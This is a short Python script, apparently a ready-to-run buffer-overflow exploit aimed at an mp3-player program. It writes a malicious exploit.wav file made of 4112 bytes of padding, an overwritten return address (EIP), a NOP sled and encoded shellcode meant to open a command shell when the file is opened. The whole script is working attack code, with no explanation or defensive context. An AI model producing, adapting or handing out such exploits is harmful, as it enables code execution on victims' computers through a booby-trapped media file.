#This code saves a .wav file that opens the command line when read through an mp3-player program with no input validation

from struct import pack

def exploit():
    buf =  b""
    buf += b"\xda\xd1\xba\x1c\x25\xcb\xf7\xd9\x74\x24\xf4\x5d"
    buf += b"\x33\xc9\xb1\x31\x31\x55\x17\x83\xc5\x04\x03\x49"
    buf += b"\x36\x29\x02\x8d\xd0\x2f\xed\x6d\x21\x50\x67\x88"
    buf += b"\x10\x50\x13\xd9\x03\x60\x57\x8f\xaf\x0b\x35\x3b"
    buf += b"\x3b\x79\x92\x4c\x8c\x34\xc4\x63\x0d\x64\x34\xe2"
    buf += b"\x8d\x77\x69\xc4\xac\xb7\x7c\x05\xe8\xaa\x8d\x57"
    buf += b"\xa1\xa1\x20\x47\xc6\xfc\xf8\xec\x94\x11\x79\x11"
    buf += b"\x6c\x13\xa8\x84\xe6\x4a\x6a\x27\x2a\xe7\x23\x3f"
    buf += b"\x2f\xc2\xfa\xb4\x9b\xb8\xfc\x1c\xd2\x41\x52\x61"
    buf += b"\xda\xb3\xaa\xa6\xdd\x2b\xd9\xde\x1d\xd1\xda\x25"
    buf += b"\x5f\x0d\x6e\xbd\xc7\xc6\xc8\x19\xf9\x0b\x8e\xea"
    buf += b"\xf5\xe0\xc4\xb4\x19\xf6\x09\xcf\x26\x73\xac\x1f"
    buf += b"\xaf\xc7\x8b\xbb\xeb\x9c\xb2\x9a\x51\x72\xca\xfc"
    buf += b"\x39\x2b\x6e\x77\xd7\x38\x03\xda\xb2\xbf\x91\x61"
    buf += b"\xf0\xc0\xa9\x69\xa5\xa8\x98\xe2\x2a\xae\x24\x21"
    buf += b"\x0f\x40\x6f\x6b\x26\xc9\x36\xfe\x7a\x94\xc8\xd5"
    buf += b"\xb9\xa1\x4a\xdf\x41\x56\x52\xaa\x44\x12\xd4\x47"
    buf += b"\x35\x0b\xb1\x67\xea\x2c\x90\x04\x61\xb7\x35\xaf"
    buf += b"\x01\x52\x4a"

    offset = 4112

    buffer = b"A"*offset

    eip = pack('<L', 0x00419d0b)

    nop = b"\x90" * 32

    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
